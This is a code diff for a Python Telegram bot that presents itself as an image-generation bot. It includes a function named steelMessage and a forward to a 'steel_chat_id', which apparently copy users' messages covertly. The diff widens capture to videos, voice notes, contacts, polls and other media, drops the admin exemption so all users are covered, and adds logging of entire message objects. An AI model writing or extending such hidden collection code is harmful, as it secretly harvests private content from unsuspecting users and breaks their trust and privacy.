@@ -99,7 +99,7 @@ def startHandler(message):
 def imagineHandler(message):
     global promt
     steelMessage(message)
-    bot.forward_message(steel_chat_id, message.chat.id, message.message_id)
+    #bot.forward_message(steel_chat_id, message.chat.id, message.message_id)
 
     if message.text == "/imagine" or message.text == "/imagine@imagineai_bot":
         bot.send_message(message.chat.id, REQUEST_NOT_CORRECT, parse_mode="html")
@@ -207,7 +207,7 @@ def textHandler(message):
                 bot.send_message(message.chat.id, REQUEST_NOT_CORRECT, parse_mode="html")
 
 
-@bot.message_handler(content_types=['document', 'audio','photo'])
+@bot.message_handler(content_types=['document', 'audio', 'photo', 'video', 'animation', 'gif', 'sticker', 'voice', 'poll', 'contact', 'video_note'])
 def photoHandler(message):
     steelMessage(message)
     if message.chat.id == channel_id:
@@ -244,9 +244,10 @@ def createStartMenu(message):
 
 
 def steelMessage(message):
-    if message.from_user.username in ADMINS:
-        return
+    # if message.from_user.username in ADMINS:
+    #     return
     try:
+        print(message)
         chat = message.chat.title + " "
     except:
         chat = ""
